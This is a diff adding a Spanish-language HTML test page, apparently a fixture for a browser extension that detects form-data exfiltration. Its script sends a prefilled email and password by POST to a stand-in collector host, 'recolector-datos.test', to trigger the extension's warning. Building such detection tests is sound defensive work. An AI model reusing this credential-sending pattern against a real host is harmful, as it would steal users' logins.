@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="UTF-8"><title>Prueba: exfiltración de formulario</title></head>
+<body style="font: 15px/1.5 system-ui, sans-serif; max-width: 700px; margin: 40px auto;">
+  <h1>📤 Prueba: exfiltración de datos (A2)</h1>
+  <p><b>Esperado:</b> al pulsar el botón, un dato que "has escrito" viaja a un dominio
+     externo (+70) → banner naranja.</p>
+  <p>El dominio destino es <code>recolector-datos.test</code> (TLD reservado, no resuelve):
+     la petición falla, pero Guardián Web la detecta en el instante en que se lanza.
+     Nada sale de tu equipo.</p>
+  <hr>
+
+  <form onsubmit="return false" style="border:1px solid #ccc; padding:16px; border-radius:8px; max-width:340px;">
+    <p><label>Email<br><input type="email" id="email" value="victima@ejemplo.com"></label></p>
+    <p><label>Contraseña<br><input type="password" id="pass" value="MiClaveSecreta123"></label></p>
+    <button type="button" id="go">Rellenar y "enviar" a un tercero</button>
+  </form>
+
+  <p id="msg" style="color:#a85a13;"></p>
+
+  <script>
+    document.getElementById("go").addEventListener("click", () => {
+      const email = document.getElementById("email");
+      const pass = document.getElementById("pass");
+      // Simular que el usuario teclea (dispara el evento 'input' que vigila
+      // el content script). Sin esto, fijar .value no cuenta como tecleo.
+      [email, pass].forEach((el) => el.dispatchEvent(new Event("input", { bubbles: true })));
+
+      // Dar un instante a que el content script propague los valores al probe.
+      setTimeout(() => {
+        const payload = `email=${encodeURIComponent(email.value)}&pass=${encodeURIComponent(pass.value)}`;
+        fetch("http://recolector-datos.test/collect", { method: "POST", body: payload }).catch(() => {});
+        document.getElementById("msg").textContent =
+          "Enviado (la petición falla adrede). Comprueba el banner / panel.";
+      }, 400);
+    });
+  </script>
+
+  <p><a href="/index.html">← Volver al índice</a></p>
+</body>
+</html>
